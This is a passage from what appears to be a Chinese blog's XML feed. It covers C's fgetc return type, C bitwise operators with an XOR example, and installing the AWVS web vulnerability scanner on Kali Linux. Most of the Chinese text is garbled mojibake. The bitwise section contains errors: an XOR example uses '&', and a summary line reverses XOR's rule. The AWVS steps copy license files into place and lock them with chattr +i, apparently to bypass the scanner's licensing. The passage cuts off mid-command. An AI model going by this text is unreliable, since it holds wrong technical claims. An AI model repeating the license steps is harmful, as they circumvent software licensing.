0xFF.</code></pre><p>(2) fgetcè¿”å›å€¼çš„ç±»å‹ï¼ˆä»¥(1)ä¸­çš„ä»£ç ä¸ºä¾‹ï¼‰</p><pre><code>   fgetc()è¿”å›ç±»å‹ä¸ºintï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶è¿”å›å€¼èµ‹ç»™ä¸€ä¸ªintç±»å‹å˜é‡ï¼Œå¦‚(1)ä¸­çš„ä»£ç ï¼Œå³ä½¿æ˜¯é‡åˆ°å­—ç¬¦0xFF(blankçš„asciiç ï¼Œä¸æ˜¯EOF),whileå¾ªç¯ä¹Ÿä¸ä¼šç»“æŸï¼Œå› ä¸º0xFFä¼šè¢«è½¬åŒ–0x000000FFï¼Œæ˜¾ç„¶è¿™ä¸0xFFFFFFFF(EOF)æ˜¯ä¸ç›¸ç­‰çš„ï¼Œè¿™æ—¶èƒ½å®Œæˆæ­£ç¡®å¤åˆ¶ï¼›  å¦‚æœç”¨ä¸€ä¸ªchar ç±»å‹çš„å˜é‡c æ¥æ¥æ”¶fgetc()çš„è¿”å›å€¼ï¼Œä¼šå‡ºç°ä»€ä¹ˆæƒ…å†µï¼Ÿ å‡å®šä¸‹ä¸€ä¸ªè¯»å–çš„å­—ç¬¦ä¸º0xFF åˆ™ï¼š</code></pre><p>char c = fgetc (rfp)ï¼› // fgetc(rfp)çš„å€¼ä¸º 0x000000FFï¼Œ ç„¶åå¼ºåˆ¶è½¬åŒ–ä¸ºcharç±»å‹ï¼šc = 0xFF<br>while(c != EOF) ï¼›     // å­—ç¬¦ä¸æ•´æ•°æ¯”è¾ƒ? c è¢«å¸¦ç¬¦å·(signed)æ‰©å±•ä¸º0xFFFFFFFFï¼Œæ¡ä»¶æˆç«‹ï¼Œæ–‡ä»¶å¤åˆ¶æå‰é€€å‡ºï¼Œæ•…é‡åˆ°ç©ºæ ¼å­—ç¬¦æ—¶å°±é€€å‡ºï¼Œä¸èƒ½å®Œæˆå¤åˆ¶ï¼›</p><pre><code>  å¦‚æœå°†c å®šä¹‰ä¸ºunsigned charï¼Œå½“è¯»åˆ°æ–‡ä»¶æœ«å°¾ï¼Œè¿”å› EOF ä¹Ÿå°±æ˜¯ -1 æ—¶ï¼š</code></pre><p>unsigned char c = fgetc (rfp)ï¼›// fgetc (rfp)çš„å€¼ä¸ºEOFï¼Œå³-1ï¼Œå³0xFFFFFFFFï¼Œç„¶åå¼ºåˆ¶è½¬åŒ–ä¸ºucharç±»å‹, c=0xFF<br>while( c!= -1)  ï¼›                        // c è¢«æ‰©å±•ä¸º 0x000000FF, æ°¸è¿œä¸ä¼šç­‰äº 0xFFFFFFFFï¼Œæ‰€ä»¥è¿™æ¬¡è™½ç„¶èƒ½æ­£ç¡®å¤åˆ¶ 0xFF, ä½†å´ä¸èƒ½åˆ¤æ–­æ–‡ä»¶ç»“æŸ. äº‹å®ä¸Š,åœ¨ c ä¸º uchar æ—¶,c != -1 æ˜¯æ°¸è¿œæˆç«‹çš„ï¼</p><pre><code>  å› æ­¤ï¼Œåªèƒ½å°†cå®šä¹‰æˆintç±»å‹çš„å˜é‡ï¼Œè¿™æ ·æ‰ä¸fgetcè¿”å›ç±»å‹ä¸€è‡´ã€‚</code></pre><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œflyyyriã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/flyyyri/article/details/5084981">https://blog.csdn.net/flyyyri/article/details/5084981</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€è¿ç®—ç¬¦</title>
    <link href="/2021/07/27/Code/C/C%E8%AF%AD%E8%A8%80%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <url>/2021/07/27/Code/C/C%E8%AF%AD%E8%A8%80%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="Cè¯­è¨€è¿ç®—ç¬¦"><a href="#Cè¯­è¨€è¿ç®—ç¬¦" class="headerlink" title="Cè¯­è¨€è¿ç®—ç¬¦"></a>Cè¯­è¨€è¿ç®—ç¬¦</h1><p>Cè¯­è¨€è¿ç®—ç¬¦æŒ‡çš„æ˜¯è¿ç®—ç¬¦å·ã€‚Cè¯­è¨€ä¸­çš„è¿ç®—ç¬¦å·åˆ†ä¸º10ç±»ï¼šç®—æœ¯è¿ç®—ç¬¦ã€å…³ç³»è¿ç®—ç¬¦ã€é€»è¾‘è¿ç®—ç¬¦ã€ä½æ“ä½œè¿ç®—ç¬¦ã€èµ‹å€¼è¿ç®—ç¬¦ã€æ¡ä»¶è¿ç®—ç¬¦ã€é€—å·è¿ç®—ç¬¦ã€æŒ‡é’ˆè¿ç®—ç¬¦ã€æ±‚å­—èŠ‚æ•°è¿ç®—ç¬¦å’Œç‰¹æ®Šè¿ç®—ç¬¦ã€‚</p><h2 id="ç§ç±»"><a href="#ç§ç±»" class="headerlink" title="ç§ç±»"></a>ç§ç±»</h2><p>Cè¯­è¨€ä¸­çš„è¿ç®—ç¬¦å·æ€»å…±æœ‰34ç§ï¼Œåˆ†ä¸º10ç±»ã€‚</p><h3 id="ä½æ“ä½œè¿ç®—ç¬¦"><a href="#ä½æ“ä½œè¿ç®—ç¬¦" class="headerlink" title="ä½æ“ä½œè¿ç®—ç¬¦"></a>ä½æ“ä½œè¿ç®—ç¬¦</h3><p>å‚ä¸è¿ç®—çš„é‡ï¼ŒæŒ‰äºŒè¿›åˆ¶ä½è¿›è¡Œè¿ç®—ã€‚</p><p>ä½æ“ä½œè¿ç®—ç¬¦å…±æœ‰6ç§ï¼ŒåŒ…æ‹¬ï¼šä½ä¸ï¼ˆ&amp;ï¼‰ã€ä½æˆ–ï¼ˆ|ï¼‰ã€ä½éï¼ˆ~ï¼‰ã€ä½å¼‚æˆ–ï¼ˆ^ï¼‰ã€å·¦ç§»ï¼ˆ&lt;&lt;ï¼‰ã€å³ç§»ï¼ˆ&gt;&gt;ï¼‰ã€‚</p><h4 id="ä½ä¸ï¼ˆ-amp-ï¼‰"><a href="#ä½ä¸ï¼ˆ-amp-ï¼‰" class="headerlink" title="ä½ä¸ï¼ˆ&amp;ï¼‰"></a>ä½ä¸ï¼ˆ&amp;ï¼‰</h4><p>å‚åŠ è¿ç®—çš„ä¸¤ä¸ªæ•°æ®ï¼ŒæŒ‰äºŒè¿›åˆ¶ä½è¿›è¡Œâ€œä¸â€è¿ç®—ã€‚</p><ul><li><p>è¿ç®—è§„åˆ™ï¼š0&amp;0=0ï¼Œ0&amp;1=0ï¼Œ1&amp;0=0ï¼Œ1&amp;1=1ï¼Œå³ï¼šä¸¤ä½åŒæ—¶ä¸º1ï¼Œç»“æœæ‰ä¸º1ï¼Œå¦åˆ™ä¸º0</p><blockquote><p>ä¾‹å¦‚ï¼š3&amp;5=1ï¼Œå³ï¼š0000 0011 &amp; 0000 0101 = 0000 0001</p></blockquote></li><li><p>è´Ÿæ•°æŒ‰è¡¥ç å½¢å¼å‚åŠ ä½ä¸è¿ç®—ã€‚</p></li><li><p>â€œä¸è¿ç®—â€çš„ç‰¹æ®Šç”¨é€”ï¼š</p><ul><li><p>å°†ä¸€ä¸ªæ•°çš„æŒ‡å®šä½ç½®ä¸º0</p><blockquote><p>å¦‚æœæƒ³å°†ä¸€ä¸ªæ•°ä¸­çš„æŸä¸€ä½ç½®ä¸ºé›¶ï¼Œåªéœ€ä¸ç›¸åº”ä½ä¸º0ï¼Œå…¶ä½™å„ä½ä¸º1çš„æ•°åšä½ä¸è¿ç®—</p><p>ä¾‹ï¼šè®¾X=1010 1110ï¼Œå°†Xçš„ç¬¬äºŒä½å˜ä¸º0ï¼Œåˆ™ 1010 1110 &amp; 1111 1011 = 1010 1010</p></blockquote></li><li><p>å–ä¸€ä¸ªæ•°çš„æŒ‡å®šä½</p><blockquote><p>å¦‚æœæƒ³å–ä¸€ä¸ªæ•°ä¸­çš„æŸä¸€æˆ–æŸäº›æŒ‡å®šä½ï¼Œåªéœ€ä¸ç›¸åº”ä½ä¸º1ï¼Œå…¶ä½™å„ä½ä¸º0çš„æ•°åšä½ä¸è¿ç®—</p><p>ä¾‹ï¼šè®¾X=1010 1110ï¼Œå–Xçš„ä½4ä½ï¼Œåˆ™ 1010 1110 &amp; 0000 1111 = 0000 1110 </p><h4 id="ä½æˆ–ï¼ˆ-ï¼‰"><a href="#ä½æˆ–ï¼ˆ-ï¼‰" class="headerlink" title="ä½æˆ–ï¼ˆ|ï¼‰"></a>ä½æˆ–ï¼ˆ|ï¼‰</h4></blockquote></li></ul></li></ul><p>å‚åŠ è¿ç®—çš„ä¸¤ä¸ªå¯¹è±¡ï¼ŒæŒ‰äºŒè¿›åˆ¶ä½è¿›è¡Œâ€œæˆ–â€è¿ç®—ã€‚</p><ul><li><p>è¿ç®—è§„åˆ™ï¼š0|0=0ï¼Œ0|1=1ï¼Œ1|0=1ï¼Œ1|1=1ï¼Œå³ï¼šå‚åŠ è¿ç®—çš„ä¸¤ä¸ªå¯¹è±¡åªè¦æœ‰ä¸€ä¸ªä¸º1ï¼Œå…¶å€¼ä¸º1</p><blockquote><p>ä¾‹å¦‚ï¼š3|5=7ï¼Œå³ï¼š0000 0011 | 0000 0101 = 0000 0111</p></blockquote></li><li><p>è´Ÿæ•°æŒ‰è¡¥ç å½¢å¼å‚åŠ ä½æˆ–è¿ç®—ã€‚</p></li><li><p>â€œæˆ–è¿ç®—â€çš„ç‰¹æ®Šç”¨é€”ï¼š</p><ul><li><p>å°†ä¸€ä¸ªæ•°çš„æŒ‡å®šä½ç½®ä¸º1</p><blockquote><p>å¦‚æœæƒ³å°†ä¸€ä¸ªæ•°ä¸­çš„æŸä¸€æˆ–æŸäº›æŒ‡å®šä½ç½®ä¸º1ï¼Œåªéœ€ä¸ç›¸åº”ä½ä¸º1ï¼Œå…¶ä½™å„ä½ä¸º0çš„æ•°åšä½æˆ–è¿ç®—</p><p>ä¾‹ï¼šè®¾X=1010 0000ï¼Œå°†Xçš„ä½4ä½ç½®ä¸º1ï¼Œåˆ™ 1010 0000 | 0000 1111 = 1010 1111</p><h4 id="ä½å¼‚æˆ–ï¼ˆ-ï¼‰"><a href="#ä½å¼‚æˆ–ï¼ˆ-ï¼‰" class="headerlink" title="ä½å¼‚æˆ–ï¼ˆ^ï¼‰"></a>ä½å¼‚æˆ–ï¼ˆ^ï¼‰</h4></blockquote></li></ul></li></ul><p>å‚åŠ è¿ç®—çš„ä¸¤ä¸ªæ•°æ®ï¼ŒæŒ‰äºŒè¿›åˆ¶ä½è¿›è¡Œâ€œå¼‚æˆ–â€è¿ç®—ã€‚</p><ul><li><p>è¿ç®—è§„åˆ™ï¼š0^0=0ï¼Œ0^1=1ï¼Œ1^0=1ï¼Œ1^1=0ï¼Œå³ï¼šå‚åŠ è¿ç®—çš„ä¸¤ä¸ªå¯¹è±¡å€¼ä¸åŒï¼Œå€¼ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚</p></li><li><p>â€œå¼‚æˆ–è¿ç®—â€çš„ç‰¹æ®Šä½œç”¨ï¼š</p><ul><li><p>ä½¿ç‰¹å®šä½ç¿»è½¬</p><blockquote><p>å¦‚æœæƒ³å°†ä¸€ä¸ªæ•°ä¸­çš„æŸä¸€æˆ–æŸäº›æŒ‡å®šä½ç½®ç¿»è½¬ï¼Œåªéœ€ä¸ç›¸åº”ä½ä¸º1ï¼Œå…¶ä½™å„ä½ä¸º0çš„æ•°åšä½å¼‚æˆ–è¿ç®— </p><p>ä¾‹ï¼šè®¾X=1010 1110ï¼Œä½¿Xä½4ä½ç¿»è½¬ï¼Œåˆ™ 1010 1110 &amp; 0000 1111 = 1010 0001 </p></blockquote></li><li><p>ä¸0å¼‚æˆ–ï¼Œä¿ç•™åŸå€¼</p><blockquote><p>ä¾‹ï¼šè®¾X=1010 1110ï¼Œåˆ™ 1010 1110 ^ 0000 0000 = 1010 1110</p></blockquote></li></ul></li></ul><p>å¼‚æˆ–è¿ç®—å…¶å®å°±æ˜¯ä¸è¿›ä½åŠ æ³•ï¼Œå¦‚1+1=0ï¼Œ0+0=0ï¼Œ1+0=1ï¼Œ0+1=1</p><ul><li>å¼‚æˆ–çš„å‡ æ¡æ€§è´¨ï¼š<ul><li>äº¤æ¢å¾‹</li><li>ç»“åˆå¾‹ï¼ˆå³(a^b)^c = a^(b^c)ï¼‰</li><li>å¯¹äºä»»ä½•æ•°xï¼Œéƒ½æœ‰x^x=0ï¼Œx^0=x</li><li>è‡ªåæ€§ï¼ša^b^b = a^0 = a</li></ul></li></ul><p>å¼‚æˆ–è¿ç®—æœ€å¸¸è§äºå¤šé¡¹å¼é™¤æ³•ï¼Œä¸è¿‡å®ƒæœ€é‡è¦çš„æ€§è´¨è¿˜æ˜¯è‡ªåæ€§ï¼šA XOR B XOR B = Aï¼Œå³å¯¹ç»™å®šçš„æ•°Aï¼Œç”¨åŒæ ·çš„è¿ç®—å› å­ï¼ˆBï¼‰ä½œä¸¤æ¬¡å¼‚æˆ–è¿ç®—åä»å¾—åˆ°Aæœ¬èº«ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªç¥å¥‡çš„æ€§è´¨ï¼Œåˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œå¯ä»¥è·å¾—è®¸å¤šæœ‰è¶£çš„åº”ç”¨ã€‚ ä¾‹å¦‚ï¼Œæ‰€æœ‰çš„ç¨‹åºæ•™ç§‘ä¹¦éƒ½ä¼šå‘åˆå­¦è€…æŒ‡å‡ºï¼Œè¦äº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ï¼Œå¿…é¡»è¦å¼•å…¥ä¸€ä¸ªä¸­é—´å˜é‡ã€‚ä½†å¦‚æœä½¿ç”¨å¼‚æˆ–ï¼Œå°±å¯ä»¥èŠ‚çº¦ä¸€ä¸ªå˜é‡çš„å­˜å‚¨ç©ºé—´ã€‚</p><p>è®¾æœ‰a,bä¸¤ä¸ªå˜é‡ï¼Œåˆ™ä»¥ä¸‹ä¸‰è¡Œè¡¨è¾¾å¼å°†äº’æ¢ä»–ä»¬çš„å€¼è¡¨è¾¾å¼ï¼š</p><blockquote><p>a=a^b;<br>b=b^a;<br>a=a^b;</p></blockquote><h4 id="å·¦ç§»ï¼ˆ-lt-lt-ï¼‰"><a href="#å·¦ç§»ï¼ˆ-lt-lt-ï¼‰" class="headerlink" title="å·¦ç§»ï¼ˆ&lt;&lt;ï¼‰"></a>å·¦ç§»ï¼ˆ&lt;&lt;ï¼‰</h4><ul><li><p>è¿ç®—è§„åˆ™ï¼šå°†ä¸€ä¸ªè¿ç®—å¯¹è±¡çš„å„äºŒè¿›åˆ¶ä½å…¨éƒ¨å·¦ç§»è‹¥å¹²ä½ï¼Œå·¦è¾¹çš„äºŒè¿›åˆ¶ä½ä¸¢å¼ƒï¼Œå³è¾¹è¡¥0ã€‚</p><blockquote><p>ä¾‹ï¼šè®¾X=1010 1110ï¼ŒX = X&lt;&lt; 2ï¼Œåˆ™ X=1010 1110 å·¦ç§»2ä½ï¼Œå³è¾¹è¡¥0ï¼ŒX=1011 1000</p></blockquote></li><li><p>è‹¥å·¦ç§»æ—¶èˆå¼ƒçš„é«˜ä½ä¸åŒ…å«1ï¼Œåˆ™æ“ä½œæ•°æ¯å·¦ç§»ä¸€ä½ï¼Œç›¸å½“äºè¯¥æ•°ä¹˜ä»¥2ï¼Œå³X = X *2</p><blockquote><p>ä¾‹ï¼šè®¾X=46=0010 1110ï¼ŒX = X&lt;&lt; 2ï¼Œåˆ™ X=0010 1110 å·¦ç§»2ä½ï¼Œå³è¾¹è¡¥0ï¼ŒX=1011 1000=184</p><p>â€‹        184 = 46 <em>2 </em>2ï¼Œå³X = X <em>2 </em>2</p></blockquote></li></ul><h4 id="å³ç§»ï¼ˆ-gt-gt-ï¼‰"><a href="#å³ç§»ï¼ˆ-gt-gt-ï¼‰" class="headerlink" title="å³ç§»ï¼ˆ&gt;&gt;ï¼‰"></a>å³ç§»ï¼ˆ&gt;&gt;ï¼‰</h4><ul><li><p>å°†ä¸€ä¸ªæ•°çš„å„äºŒè¿›åˆ¶ä½å…¨éƒ¨å³ç§»è‹¥å¹²ä½ï¼Œæ­£æ•°å·¦è¡¥0ï¼Œè´Ÿæ•°å·¦è¡¥1ï¼Œå³è¾¹ä¸¢å¼ƒã€‚</p><blockquote><p>ä¾‹å¦‚ï¼šè®¾X=1010 1110ï¼ŒX = X &gt;&gt; 2ï¼Œåˆ™ X=1010 1110 å³ç§»2ä½ï¼Œå·¦è¾¹è¡¥0ï¼ŒX=0010 1011</p></blockquote></li><li><p>æ“ä½œæ•°æ¯å³ç§»ä¸€ä½ï¼Œç›¸å½“äºè¯¥æ•°é™¤ä»¥2ï¼Œå³X = X /2</p></li><li>å·¦è¡¥0 or è¡¥1å¾—çœ‹è¢«ç§»æ•°æ˜¯æ­£è¿˜æ˜¯è´Ÿã€‚</li></ul><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å½“è¿›è¡Œä½è¿ç®—æ—¶ï¼Œé¦–å…ˆè½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œç„¶åè®¡ç®—</p><ul><li><p>ä½ä¸ &amp;ï¼šå…¨1ä¸º1ï¼Œ å…¶ä»–çš„ä¸º0</p></li><li><p>ä½æˆ– |ï¼šå…¨0ä¸º0ï¼Œå…¶ä»–ä¸º1</p></li><li><p>å¼‚æˆ– ^ï¼šç›¸åŒä¸º1ï¼Œä¸åŒä¸º0</p></li><li><p>å·¦ç§» &lt;&lt; ï¼šA &lt;&lt; b   == &gt;&gt;   A *ï¼’^bæ¬¡æ–¹ï¼Œæ³¨æ„è¾¹ç•Œï¼Œåœ¨32ä¸ºæœºå™¨ä¸‹ï¼Œå¦‚æœï½‚&gt;32ï¼Œb% 32 = tï¼Œåˆ™a &lt;&lt; t</p></li><li><p>å³ç§» &gt;&gt; ï¼šA &gt;&gt; b   == &gt;&gt;   A / 2 ^b æ¬¡æ–¹</p></li></ul><h5 id="åº”ç”¨ä¸¾ä¾‹1ï¼š"><a href="#åº”ç”¨ä¸¾ä¾‹1ï¼š" class="headerlink" title="åº”ç”¨ä¸¾ä¾‹1ï¼š"></a>åº”ç”¨ä¸¾ä¾‹1ï¼š</h5><p>1-1000æ”¾åœ¨å«æœ‰1001ä¸ªå…ƒç´ çš„æ•°ç»„ä¸­ï¼Œåªæœ‰å”¯ä¸€çš„ä¸€ä¸ªå…ƒç´ å€¼é‡å¤ï¼Œå…¶å®ƒå‡åªå‡ºç°ä¸€æ¬¡ã€‚æ¯ä¸ªæ•°ç»„å…ƒç´ åªèƒ½è®¿é—®ä¸€æ¬¡ï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œå°†å®ƒæ‰¾å‡ºæ¥ã€‚ä¸ç”¨è¾…åŠ©å­˜å‚¨ç©ºé—´ï¼Œèƒ½å¦è®¾è®¡ä¸€ä¸ªç®—æ³•å®ç°ï¼Ÿ</p><ul><li><p>è§£æ³•ä¸€ï¼šå°†æ‰€æœ‰æ•°åŠ èµ·æ¥ï¼Œå‡å»1+2+â€¦+1000çš„å’Œï¼Œç»“æœä¾¿æ˜¯é‡å¤çš„å…ƒç´ ã€‚</p><blockquote><p>è¿™ä¸ªç®—æ³•å·²ç»è¶³å¤Ÿå®Œç¾äº†ï¼Œä½†å”¯ä¸€çš„é—®é¢˜æ˜¯ï¼Œå¦‚æœæ•°åˆ—è¿‡å¤§ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æº¢å‡ºã€‚</p></blockquote></li><li><p>è§£æ³•äºŒï¼šå°†æ‰€æœ‰çš„æ•°å…¨éƒ¨å¼‚æˆ–ï¼Œå¾—åˆ°çš„ç»“æœä¸1^2^3^â€¦^1000çš„ç»“æœè¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°çš„ç»“æœå°±æ˜¯é‡å¤å…ƒç´ ã€‚</p><blockquote><p>å¼‚æˆ–å°±æ²¡æœ‰æº¢å‡ºé—®é¢˜ï¼Œå¹¶ä¸”æ€§èƒ½æ›´å¥½ã€‚</p></blockquote></li></ul><h5 id="åº”ç”¨ä¸¾ä¾‹2-ç»¼åˆ-amp-å’Œ-ï¼š-lt-span-class-â€hintâ€”top-hintâ€”roundedâ€-aria-label-â€é¢˜ç›®é“¾æ¥-http-gdutcode-sinaapp-com-problem-php-cid-1051-amp-pid-7"><a href="#åº”ç”¨ä¸¾ä¾‹2-ç»¼åˆ-amp-å’Œ-ï¼š-lt-span-class-â€hintâ€”top-hintâ€”roundedâ€-aria-label-â€é¢˜ç›®é“¾æ¥-http-gdutcode-sinaapp-com-problem-php-cid-1051-amp-pid-7" class="headerlink" title="åº”ç”¨ä¸¾ä¾‹2(ç»¼åˆ&amp;å’Œ)ï¼š&lt;span class=â€hintâ€”top hintâ€”roundedâ€ aria-label=â€é¢˜ç›®é“¾æ¥:http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7"></a>åº”ç”¨ä¸¾ä¾‹2(ç»¼åˆ&amp;å’Œ)ï¼š<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote">&lt;span class=â€hintâ€”top hintâ€”roundedâ€ aria-label=â€é¢˜ç›®é“¾æ¥:<a href="http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7">http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7</a></a></sup></h5><p>â€œ&gt;[1]&lt;/span&gt;&lt;/a&gt;&lt;/sup&gt;</p><p>ä¸€ç³»åˆ—æ•°ä¸­ï¼Œé™¤ä¸¤ä¸ªæ•°å¤–å…¶ä»–æ•°å­—éƒ½å‡ºç°è¿‡ä¸¤æ¬¡ï¼Œæ±‚è¿™ä¸¤ä¸ªæ•°å­—ï¼Œå¹¶ä¸”æŒ‰ç…§ä»å°åˆ°å¤§çš„é¡ºåºè¾“å‡ºã€‚ä¾‹å¦‚ 2 2 1 1 3 4ï¼Œæœ€åè¾“å‡ºçš„å°±æ˜¯3å’Œ4ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> t,<span class="hljs-keyword">int</span> *data)</span>      <span class="hljs-comment">//æ•°æ®ç»„æ•°tã€æ•°æ®data</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span>(t--)<br>    &#123;<br>        <span class="hljs-keyword">int</span> n;     <span class="hljs-comment">//æ¯ç»„æ•°æ®å«æœ‰çš„æ•°æ®é‡</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>        data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>((n+<span class="hljs-number">1</span>)*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>        <span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>;                    <span class="hljs-comment">//ä½å¼‚æˆ–è¿ç®—åï¼Œæ•°æ®ä¸å˜</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;data[i]);   <span class="hljs-comment">//è¾“å…¥æ•°æ®</span><br>            x ^= data[i];            <span class="hljs-comment">//xä¸ºä¸¤ä¸ªä¸åŒæ•°æ®çš„ä½å¼‚æˆ–ï¼ˆä½å¼‚æˆ–è¿ç®—çš„è‡ªåæ€§ï¼‰</span><br>        &#125;<br>        <span class="hljs-keyword">int</span> num1 = <span class="hljs-number">0</span>, num2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> tmp = <span class="hljs-number">1</span>;                 <span class="hljs-comment">//1ä¸ä»»ä½•æ•°è¿ç®—åæ•°ä¸å˜ï¼Œ0ä¸ä»»ä½•æ•°è¿ç®—åéƒ½ä¸º0</span><br>        <span class="hljs-keyword">while</span>(!(tmp &amp; x))           <span class="hljs-comment">//æ‰¾åˆ°ä¸¤ä¸ªæ•°æ®ä¸åŒçš„ä½ï¼Œtmpä¸­ç›¸åº”çš„ä½ä¸º1ï¼Œå…¶ä½™ä¸º0</span><br>            tmp &lt;&lt;= <span class="hljs-number">1</span>;              <span class="hljs-comment">//tmpå·¦ç§»ä¸€ä½</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(tmp &amp; data[i])       <span class="hljs-comment">//é™¤æ‰¾åˆ°çš„ä½å¤–ï¼Œå…¶ä½™ä½åœ¨è¿›è¡Œä¸è¿ç®—åéƒ½ä¸ºé›¶</span><br>                num1 ^= data[i];<br>            <span class="hljs-keyword">else</span><br>                num2 ^= data[i];<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>, min(num1, num2), max(num1, num2));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>é¢˜ç›®é“¾æ¥:<a href="http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7">http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kaliå®‰è£…AWVS</title>
    <link href="/2021/07/27/Linux/Kali/kali%E5%AE%89%E8%A3%85AWVS/"/>
    <url>/2021/07/27/Linux/Kali/kali%E5%AE%89%E8%A3%85AWVS/</url>
    
    <content type="html"><![CDATA[<h2 id="Kali-Linux-å®‰è£…-AWVS-14-6-21120709"><a href="#Kali-Linux-å®‰è£…-AWVS-14-6-21120709" class="headerlink" title="Kali Linux å®‰è£… AWVS 14.6.21120709"></a>Kali Linux å®‰è£… AWVS 14.6.21120709</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chmod +x acunetix_14.6.211207099_x64.sh</span><br><span class="hljs-meta">$</span><span class="bash"> sudo ./acunetix_14.6.211207099_x64.sh</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp license_info.json /home/acunetix/.acunetix/data/license</span> <br><span class="hljs-meta">$</span><span class="bash"> sudo cp wa_data.dat /home/acunetix/.acunetix/data/license</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo chmod 444 /home/acunetix/.acunetix/data/license/license_info.json</span> <br><span class="hljs-meta">$</span><span class="bash"> sudo chmod 444 /home/acunetix/.acunetix/data/license/wa_data.dat</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo chattr +i /home/acunetix/.acunetix/data/license/license_info.json</span> <br><span class="hljs-meta">$</span><span class="bash"> chattr +i /home/acunetix/.acunetix/data/license/wa_data.dat</span><br></code></pre></td></tr></table></figure><h2 id="Kali-Linux-å®‰è£…-AWVS-14-5-211115146"><a href="#Kali-Linux-å®‰è£…-AWVS-14-5-211115146" class="headerlink" title="Kali Linux å®‰è£… AWVS 14.5.211115146"></a>Kali Linux å®‰è£… AWVS 14.5.211115146</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chmod +x Acunetix_14.5.211115146_x64.sh</span><br><span class="hljs-meta">$</span><span class="bash"> sudo ./Acunetix_14.5.211115146_x64.sh</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp license_info.json /home/acunetix/.acunetix/data/license</span><br><span class="hljs-meta">$</span><span 